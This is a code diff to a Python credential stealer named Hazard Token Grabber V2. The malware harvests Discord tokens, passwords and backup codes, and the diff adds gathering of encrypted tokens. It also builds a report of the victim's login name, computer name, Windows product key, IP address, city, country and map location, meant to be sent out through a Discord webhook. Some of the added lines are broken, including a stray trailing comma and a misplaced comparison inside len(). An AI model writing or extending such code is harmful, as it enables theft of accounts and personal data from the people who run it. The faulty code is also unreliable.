@@ -31,6 +31,7 @@ class Hazard_Token_Grabber_V2:
             pass
 
         self.tokens = []
+        self.encrypted_tokens = []
         self.discord_psw = []
         self.backup_codes = []
         
@@ -323,7 +324,8 @@ class Hazard_Token_Grabber_V2:
                                         for i in range(len(y)):
                                             if y[i:i+len("\"")] == "\"":
                                                 token = y[:i]
-                                                self.tokens.append(token)
+                                                if token not in self.encrypted_tokens:
+                                                    self.encrypted_tokens.append(token)
         if os.path.exists(os.getenv("appdata")+"\\Mozilla\\Firefox\\Profiles"):
             for path, subdirs, files in os.walk(os.getenv("appdata")+"\\Mozilla\\Firefox\\Profiles"):
                 for _file in files:
@@ -427,6 +429,11 @@ class Hazard_Token_Grabber_V2:
         for f in files:
             self.files += f"\n{f}"
         self.fileCount = f"{len(files)} Files Found: "
+        desc = f'**{os.getlogin()}** Just ran Hazard Token Grabber.V2\n```fix\nComputerName: {os.getenv("COMPUTERNAME")}\n{wname}: {wkey if wkey else "No Product Key"}\nIP: {ip}\nCity: {city}\nRegion: {region}\nCountry: {country}```[Google Maps Location]({googlemap})\n```fix\n{self.fileCount}{self.files}```',
+        if len(self.encrypted_tokens > 0):
+            desc += "\n**Encrypted Tokens**\n\n"
+            for i in self.encrypted_tokens:
+                desc += f"```{i}```\n"
         embed = {
             "avatar_url":"https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Token-Grabber-V2/Big_hazard.gif",
             "embeds": [
@@ -436,7 +443,7 @@ class Hazard_Token_Grabber_V2:
                         "url": "https://github.com/Rdimo/Hazard-Token-Grabber-V2",
                         "icon_url": "https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Token-Grabber-V2/Small_hazard.gif"
                     },
-                    "description": f'**{os.getlogin()}** Just ran Hazard Token Grabber.V2\n```fix\nComputerName: {os.getenv("COMPUTERNAME")}\n{wname}: {wkey if wkey else "No Product Key"}\nIP: {ip}\nCity: {city}\nRegion: {region}\nCountry: {country}```[Google Maps Location]({googlemap})\n```fix\n{self.fileCount}{self.files}```',
+                    "description": desc,
                     "color": 16119101,
 
                     "thumbnail": {
